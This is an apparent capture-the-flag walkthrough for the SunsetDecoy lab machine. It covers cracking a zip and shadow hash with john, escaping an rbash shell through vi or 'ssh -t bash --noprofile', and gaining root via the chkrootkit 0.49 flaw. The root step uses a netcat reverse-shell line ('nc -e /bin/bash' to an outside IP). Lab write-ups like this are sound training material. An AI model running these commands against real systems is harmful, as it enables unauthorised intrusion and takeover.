# SunsetDecoy
### Enumeration
Nmap shows only ports 22 and 80 are open. Browsing to 80, we see a zip file, which we download. When we try to unzip, we're asked for a password, so we'll crack it with `john`:

```
zip2john save.zip > zip.hash
john zip.hash
```

`john` tells us the password is `manuel`. Unzipping, we find a folder containing a number of useful files, including `shadow`, which contains a password hash for the user `296640a3b825115a47b68fc44501c828`. We crack this password using `john`, which tells us that it's `server`.

### Foothold

We can use these credentials to SSH into the server. We have an `rbash` shell, so we're unable to use a number of commands, including `cat`, despite the fact the user flag is in our home directory. There's an executable called `honeypot.decoy` that we can run. If we select option `7 Leave a note.`, we get put in `vi` (despite the fact we cannot execute `vi` ourselves). As noted on GTFObins, we can get a shell through vi using the following commands:

```
:set shell=/bin/bash
:shell
```

The alternative to this is to SSH in using the following command

```
ssh 296640a3b825115a47b68fc44501c828@192.168.57.85 -t 'bash --noprofile'
```

Even in this new shell, commands are "not found". Turns out our path just contains our home directory, so we'll update to include `/bin`:

```
export PATH=/bin:$PATH
```

### Privilege Escalation

It doesn't seem like any of the commands executed by `honeypot.decoy` are executed as `root`, except perhaps for `5`, which does an AV scan. If we can figure out what command this is actually executing, we might be able to poison the path.

We can use [pspy](https://github.com/DominicBreuker/pspy) to track what commands are being executed by the machine. `pspy` works even for unprivileged users.

Running this, we see that `chkrootkit-0.49` is being run every minute. Googling, we find there's a vulnerability. We can create an executable file in `/tmp` called `update` that will be executed with privileges by `chkrootkit`. We write the following to `/tmp/update`:

```
/bin/nc -e /bin/bash 192.168.57.85 9002
```

If we launch a netcat listener on our local machine, we'll get a connection at the start of the next minute, giving us a root shell.